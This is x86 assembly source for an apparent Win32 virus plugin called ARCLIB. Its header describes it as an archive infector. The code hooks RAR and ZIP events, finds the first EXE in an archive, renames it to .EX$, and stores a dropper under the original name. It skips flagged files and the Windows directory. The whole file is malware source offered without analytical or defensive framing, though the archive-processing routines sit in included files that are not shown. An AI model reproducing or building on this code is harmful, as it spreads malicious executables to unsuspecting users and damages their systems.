   ; ARCLIB
   ; ~~~
   ; - .RAR/.ZIP archives infector
   ;     þ find 1st .EXE file in the archive (scan max ARC_MAXFILETOSCAN files)
   ;     þ rename it to .EX$
   ;     þ add dropper (storing) with name of the EXE file

   ARC_MAXFILETOSCAN       equ     50      ; scan max # of files within archive

   include                 INCLUDE\consts.inc
   include                 system.inc
   include                 extman.inc
   include                 r3io.inc
   include                 dropper.inc
   include                 badfile.inc
   include                 fastname.inc

   include                 plugin.inc
                           PLUGIN_START    ARCLIB, W32R3, PERMUTABLE

   handleevent:            hookevent EV_EXTMAN_GOT_RAR, rar
                           hookevent EV_EXTMAN_GOT_ZIP, zip
                           stc
                           retn

   ; input: EDX=filename

   rar:                    pusha
                           call    _isbadarc
                           je      __exit
                           call    process_rar
   __exit:                 popa
                           clc
                           retn

   ; input: EDX=filename

   zip:                    pusha
                           call    _isbadarc
                           je      __exit
                           call    process_zip
   __exit:                 popa
                           clc
                           retn

   include                 arc_crc.inc

   callZ                   macro   x               ; via rar/zip_saveebp
                           eventX  EV_r3_&x
                           endm

   include                 arc_rar.inc
   include                 arc_zip.inc

   ; input: EDX=filename
   ; output:ZF==1 (jz) -- bad name
   ;        ZF==0 (jnz)-- good name

   _isbadarc:              pusha

                           event   EV_BADFILE_ISBADFILE
                           jnc     __bad

                           event   EV_FASTNAME_ISNEWFILE
                           jnc     __bad

   __cycle:                mov     eax, [edx]
                           inc     edx
                           or      al, al
                           jz      __exit
                           or      eax, 20202000h
                           neg     eax
   ; do not process archivez in the md dir (JARz)
                           cmp     eax, -'niw\'    ; c:\WINdows\...
                           jne     __cycle         ;   ~~~~

   __bad:                  xor     eax, eax ; ZR, bad file
                           popa
                           retn

   __exit:                 inc     eax     ; NZ, normal file
                           popa
                           retn

                           PLUGIN_END
